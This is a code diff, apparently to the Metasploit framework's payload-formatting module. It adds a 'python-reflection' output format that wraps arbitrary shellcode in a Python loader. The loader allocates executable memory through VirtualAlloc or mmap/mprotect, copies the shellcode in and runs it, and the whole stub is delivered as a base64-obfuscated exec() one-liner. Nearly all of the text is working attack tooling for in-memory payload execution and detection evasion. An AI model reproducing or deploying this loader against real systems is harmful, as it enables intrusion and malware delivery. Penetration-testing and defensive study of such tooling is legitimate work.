@@ -1437,6 +1437,35 @@ require 'msf/core/exe/segment_appender'
     read_replace_script_template("to_powershell.hta.template", hash_sub)
   end
 
+  def self.to_python_reflection(framework, arch, code, exeopts)
+    unless [ ARCH_X86, ARCH_X64, ARCH_AARCH64, ARCH_ARMLE, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_PPC ].include? arch
+      raise RuntimeError, "Msf::Util::EXE.to_python_reflection is not compatible with #{arch}"
+    end
+    python_code = <<~PYTHON
+      #{Rex::Text.to_python(code)}
+      import ctypes,os
+      if os.name == 'nt':
+       cbuf = (ctypes.c_char * len(buf)).from_buffer_copy(buf)
+       ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+       ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
+       ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]
+       ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(buf)))
+       ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+      else:
+       import mmap
+       from ctypes.util import find_library
+       c = ctypes.CDLL(find_library('c'))
+       c.mmap.restype = ctypes.c_void_p
+       ptr = c.mmap(0,len(buf),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
+       ctypes.memmove(ptr,buf,len(buf))
+       c.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
+       c.mprotect(ptr,len(buf),mmap.PROT_READ|mmap.PROT_EXEC)
+       ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+    PYTHON
+
+    "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('#{Rex::Text.encode_base64(python_code)}')[0]))"
+  end
+
   def self.to_jsp(exe)
     hash_sub = {}
     hash_sub[:var_payload]       = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -2269,6 +2298,8 @@ require 'msf/core/exe/segment_appender'
       Msf::Util::EXE.to_powershell_command(framework, arch, code)
     when 'hta-psh'
       Msf::Util::EXE.to_powershell_hta(framework, arch, code)
+    when 'python-reflection'
+      Msf::Util::EXE.to_python_reflection(framework, arch, code, exeopts)
     end
   end
 
@@ -2300,6 +2331,7 @@ require 'msf/core/exe/segment_appender'
       "psh-cmd",
       "psh-net",
       "psh-reflection",
+      "python-reflection",
       "vba",
       "vba-exe",
       "vba-psh",
